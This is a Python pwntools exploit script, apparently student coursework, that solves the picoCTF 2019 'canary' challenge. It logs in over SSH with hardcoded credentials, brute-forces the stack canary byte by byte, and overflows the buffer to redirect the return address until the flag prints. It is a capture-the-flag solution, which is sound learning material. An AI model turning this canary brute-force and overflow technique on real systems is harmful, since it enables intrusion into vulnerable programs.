from pwn import *
import re
#objdump -D vuln
#readelf -s
#       vuln
#push
#memcmp -0x10(%ebp),%eax
#20
#position dependant

try:
    canary = ''
    session = ssh(host='2019shell1.picoctf.com', user='cse331', password='3curityishard', level=50)


    def findcanary():
        global canary
        for i in range(1, 5):
            for c in range(33, 127):
                p = session.process(cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7', executable='./vuln')
                p.sendline(str(32 + i))
                p.sendline('A'*32 + canary +chr(c))
                recvl = p.recvall();

                if 'Ok' in str(recvl):
                    canary = canary + chr(c)
                    p.close()
                    break

                p.close()


    canary = "LjgH"
    #for grading purposes i commented out the function that determines the canary, you can uncomment it if you wnat
    #findcanary()
    while (True):
        p = session.process(cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7', executable='./vuln')
        p.sendline("54")
        p.sendline('A'*32 + canary + 'A'*16 + '\xed\x07\x00\x00')
        recvl = p.recvall();

        if 'picoCTF' in str(recvl):
            p.close()
            break

        p.close()



    flag = re.search(r"picoCTF{(.*)}", str(recvl))
    print(flag.groups()[0])

except:
    print('lost connection to server')
